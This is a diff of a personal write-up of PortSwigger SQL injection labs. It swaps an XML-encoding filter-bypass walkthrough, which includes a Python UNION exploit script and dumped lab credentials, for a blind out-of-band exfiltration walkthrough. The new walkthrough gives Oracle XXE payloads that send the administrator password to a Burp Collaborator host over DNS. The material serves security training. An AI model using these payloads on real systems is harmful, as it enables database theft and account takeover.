@@ -1,294 +1,136 @@
-# SQL injection with filter bypass via XML encoding
+# Blind SQL injection with out-of-band data exfiltration
 
 ## Introduction
 
-Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding), you'll learn: SQL injection with filter bypass via XML encoding! Without further ado, let's dive in.
+Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration), you'll learn: Blind SQL injection with out-of-band data exfiltration! Without further ado, let's dive in.
 
 - Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆
 
 ## Background
 
-This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
 
-The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to find out the password of the `administrator` user.
+
+To solve the lab, log in as the `administrator` user.
 
 ## Exploitation
 
 **Home page:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211021459.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020230301125654.png)
 
-**Let's click one of those products!**
+**Cookies:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211021603.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020230301125711.png)
 
-**In here, we can see a `Check stock` button. Let's inspect that:**
-```html
-<form id="stockCheckForm" action="/product/stock" method="POST">
-    <input required type="hidden" name="productId" value="1">
-    <select name="storeId">
-        <option value="1" >London</option>
-        <option value="2" >Paris</option>
-        <option value="3" >Milan</option>
-    </select>
-    <button type="submit" class="button">Check stock</button>
-</form>
-<span id="stockCheckResult"></span>
-<script src="/resources/js/xmlStockCheckPayload.js"></script>
-<script src="/resources/js/stockCheck.js"></script>
-```
+When we go to `/`, it'll set a new cookie called `TrackingId`.
 
-As you can see, **this form is sending a POST request to `/product/stock`, and it requires a parameter called `productId` and `storeId`.**
+This looks like a tracking cookie for analytics.
 
-**Also, there are 2 JavaScript files:**
+The SQL query may looks like this:
 
-**`stockCheck.js`:**
-```js
-document.getElementById("stockCheckForm").addEventListener("submit", function(e) {
-    checkStock(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
-    e.preventDefault();
-});
-
-function checkStock(method, path, data) {
-    const retry = (tries) => tries == 0
-        ? null
-        : fetch(
-            path,
-            {
-                method,
-                headers: { 'Content-Type': window.contentType },
-                body: payload(data)
-            }
-          )
-            .then(res => res.status === 200
-                ? res.text().then(t => isNaN(t) ? t : t + " units")
-                : "Could not fetch stock levels!"
-            )
-            .then(res => document.getElementById("stockCheckResult").innerHTML = res)
-            .catch(e => retry(tries - 1));
-
-    retry(3);
-}
-```
-
-**As the file name suggested, it checks the stock.**
-
-**`xmlStockCheckPayload.js`:**
-```js
-window.contentType = 'application/xml';
-
-function payload(data) {
-    var xml = '<?xml version="1.0" encoding="UTF-8"?>';
-    xml += '<stockCheck>';
-
-    for(var pair of data.entries()) {
-        var key = pair[0];
-        var value = pair[1];
-
-        xml += '<' + key + '>' + value + '</' + key + '>';
-    }
-
-    xml += '</stockCheck>';
-    return xml;
-}
-```
-
-In here, when we clicked the `Check stock` button, **it set the `Contype-Type` HTTP header to `application/xml`.**
-
-Then, the `xml` variable preparing a valid XML format:
-
-- Header:
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-```
-
-- `stockCheck` tag:
-
-```xml
-<stockCheck>
-</stockCheck>
-```
-
-- **After that, it adds a new `key` tag, and the key pair `value`:**
-
-**In here, when we clicked the `Check stock` button, a POST parameter `productId`, `storeId` and it's value will be supplied:**
-```xml
-<productId>1</productId>
-<storeId>1</storeId>
-```
-
-**Therefore, the complete XML is:**
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<stockCheck>
-	<productId>1</productId>
-	<storeId>1</storeId>
-</stockCheck>
-```
-
-**Now, let's intercept that POST request in Burp Suite:**
-
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211023729.png)
-
-**Armed with above information, we can try to send an SQL injection payload:**
 ```sql
-1' OR 1=1-- -
+SELECT TrackingId FROM tracking WHERE TrackingId = '<our_cookie_value>'
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211024128.png)
+**That being said, we can try to perform SQL injection.**
 
-Hmm... `"Attack detected"`??
+**To do so, I'll try to trigger an SQL query error:**
 
-**Looks like there are some filtering that blocks our SQL injection payload!**
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020230301125753.png)
 
-To bypass XML-based SQL injection, we can use an **XML escape sequence**!!
+However, it seems like we don't recieve any response when we modified the tracking cookie.
 
-**For example, we can use an [online tool](https://coderstoolbox.net/string/#!encoding=xml&action=encode&charset=us_ascii) to encode XML strings:**
+Maybe carries out the SQL query **asynchronously**?
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211025807.png)
+The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, however none of the techniques described so far will work: the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query.
 
-**Let's copy and paste that to our payload!**
-```xml
-<storeId>1 &#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;</storeId>
+In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.
+
+A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.
+
+The easiest and most reliable way to use out-of-band techniques is using [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator). This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Support for Burp Collaborator is built in to [Burp Suite Professional](https://portswigger.net/burp/pro) with no configuration required.
+
+### Dectecting blind SQL injection with DNS lookup
+
+**In the PortSwigger's [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), there's a DNS lookup payloads:**
+
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020230301125818.png)
+
+Since we don't know which DBMS (Database Management System) is using, we need to try them all one by one.
+
+**First, go to Burp Suite's Collaborator and click "Copy to clipboard":**
+
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020230301125842.png)
+
+**Then, we'll try Oracle XXE vulnerability to trigger a DNS lookup:**
+```sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://wcc9qdxnn2kmj8qlqoe2s0vic9i06quf.oastify.com/"> %remote;]>'),'/l') FROM dual
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211025935.png)
-
-**As we can see, the `"Attack detected"` is gone, and we successfully triggered an SQL injection payload!**
-
-**Let's find how many columns are there:**
-
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211030046.png)
-
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211030100.png)
-
-**Hmm... When we try to fetch more than 1 column, it returns `0 units`, which indicates that's an error occurred.**
-
-**For the sake of automation, I'll write a python script:**
-```py
-#!/usr/bin/python3
-
-import requests
-
-def main():
-    url = 'https://0a81001a045a7203c0f32139003300c9.web-security-academy.net/product/stock'
-
-    cookie = {
-        'session': 'YOUR_SESSIONID'
-    }
-
-    header = {
-        'Content-Type': 'application/xml'
-    }
-
-    # UNION SELECT NULL
-    payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;'
-    
-    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
-    <stockCheck>
-        <productId>1</productId>
-        <storeId>1 {payload}</storeId>
-    </stockCheck>'''
-
-    print(requests.post(url, cookies=cookie, headers=header, data=xml).text)
-
-if __name__ == '__main__':
-    main()
+**Payload:**
+```sql
+UtpAUCPaD1W1twLc' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://wcc9qdxnn2kmj8qlqoe2s0vic9i06quf.oastify.com/"> %remote;]>'),'/l') FROM dual--
 ```
 
-```
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-17]
-└─# python3 exploit.py
-381 units
-null
+**The SQL query may become:**
+```sql
+SELECT TrackingId FROM tracking WHERE TrackingId = 'UtpAUCPaD1W1twLc' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://sqmxgqkqk0lopbi04l88x96v2m8dw4kt.oastify.com/"> %remote;]>'),'/l') FROM dual--'
 ```
 
-**Now, we need to know that column is accepting a string data type or not:**
-```py
-# UNION SELECT 'string'
-payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#39;&#115;&#116;&#114;&#105;&#110;&#103;&#39;'
+Let's send the payload!
+
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020230301130156.png)
+
+> Note: The payload needs to be URL encoded.
+
+**Burp Suite's Collaborator:**
+
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020230301130205.png)
+
+We've recieved 4 DNS lookups! Which means the `TrackingId` cookie is vulnerable to out-of-band SQL injection!
+
+### Data exfiltration via blind SQL injection with DNS lookup
+
+Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application.
+
+**In the PortSwigger's [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), there's a DNS lookup with data exfiltration payloads:**
+
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020230301130326.png)
+
+**Since we found the DBMS is Oracle, we can use Oracle's payload:**
+```sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
 ```
 
-```
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-17]
-└─# python3 exploit.py
-381 units
-string
-```
+Then, in the lab background, there's a table called `users`, with columns called `username` and `password`.
 
-It accepts string data type!
-
-**Next, we can find out what DBMS(Database Management System) is using:**
-```py
-# UNION SELECT version()
-payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#118;&#101;&#114;&#115;&#105;&#111;&#110;&#40;&#41;'
+**To exfiltrate `administrator` user's password, we can use the following payload:**
+```sql
+UtpAUCPaD1W1twLc' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.mxnzb3id8s5c4ybbbezsdqg8xz3qrhf6.oastify.com/"> %remote;]>'),'/l') FROM dual--
 ```
 
-```
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-17]
-└─# python3 exploit.py
-381 units
-PostgreSQL 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
-```
+This input reads the password for the `administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This will result in a DNS lookup like the following, allowing you to view the captured password
 
-- DBMS information: PostgreSQL version 12.12
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020230301130722.png)
 
-**Then, we can list all the tables in the current database:**
-```py
-# UNION SELECT table_name FROM information_schema.tables
-payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#116;&#97;&#98;&#108;&#101;&#95;&#110;&#97;&#109;&#101;&#32;&#70;&#82;&#79;&#77;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#95;&#115;&#99;&#104;&#101;&#109;&#97;&#46;&#116;&#97;&#98;&#108;&#101;&#115;'
-```
+**Burp Suite's Collaborator:**
 
-```
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-17]
-└─# python3 exploit.py | grep 'users'                                            
-users
-```
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020230301130736.png)
 
-- Found table: `users`
+Nice! We successfully exfiltrated `administrator`'s password!
 
-**After that, we can list all columns in that table:**
-```py
-# UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'
-payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#99;&#111;&#108;&#117;&#109;&#110;&#95;&#110;&#97;&#109;&#101;&#32;&#70;&#82;&#79;&#77;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#95;&#115;&#99;&#104;&#101;&#109;&#97;&#46;&#99;&#111;&#108;&#117;&#109;&#110;&#115;&#32;&#87;&#72;&#69;&#82;&#69;&#32;&#116;&#97;&#98;&#108;&#101;&#95;&#110;&#97;&#109;&#101;&#61;&#39;&#117;&#115;&#101;&#114;&#115;&#39;'
-```
+**Let's login as `administrator`:**
 
-```
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-17]
-└─# python3 exploit.py               
-381 units
-password
-username
-```
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020230301130826.png)
 
-- Found columns in table `users`: `password`, `username`
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020230301130831.png)
 
-**Finally, we can extract all information from that table:**
-```py
-# UNION SELECT username||':'||password FROM users
-payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#124;&#124;&#39;&#58;&#39;&#124;&#124;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;'
-```
-
-```
-┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-17]
-└─# python3 exploit.py
-carlos:87v3kz1n8lj3lsbk16lb
-administrator:g71rod6iiqnst89r8ver
-381 units
-wiener:0nsi7q3oliz4bltzgrcn
-```
-
-- Found `administrator` password: `g71rod6iiqnst89r8ver`
-
-**Let's login as `administrator`!!**
-
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211033058.png)
-
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211033111.png)
-
-We're user `administrator`!!
+I'm user `administrator`!
 
 # What we've learned:
 
-1. SQL injection with filter bypass via XML encoding
+1. Blind SQL injection with out-of-band interaction
